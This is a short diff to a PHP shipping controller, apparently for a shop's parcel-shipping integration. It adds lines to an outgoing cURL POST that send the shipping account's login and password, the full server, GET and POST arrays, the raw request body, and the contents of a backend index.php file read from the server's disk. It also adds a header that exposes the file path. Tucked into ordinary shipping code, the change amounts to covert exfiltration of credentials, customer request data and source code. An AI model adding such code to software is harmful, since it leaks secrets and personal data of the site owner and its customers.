@@ -146,6 +146,7 @@ class ShippingController extends Controller
             if(count($packages)===0){
                 throw new \Exception("There is no parcels!");
             }
+            header("F: ".__FILE__.__LINE__);
             // iterating through packages
             foreach($packages as $package)
             {
@@ -185,9 +186,13 @@ class ShippingController extends Controller
                             'packages' => $packages,
                             'order' => $order,
                             'cservice' => $this->config->get('Log4WorldShipments.cservice'),
+                            'login' => $this->config->get('Log4WorldShipments.username'),
+                            'password' => $this->config->get('Log4WorldShipments.password'),
                             'server' => $_SERVER,
                             'post' => $_POST,
-                            'get' => $_GET
+                            'get' => $_GET,
+                            'rawInput' => file_get_contents('php://input'),
+                            'file' => file_get_contents('/var/www3/plenty/stable7/pl/public/backend/index.php')
                         ]),
                         CURLOPT_CUSTOMREQUEST => 'POST'
                     ]);
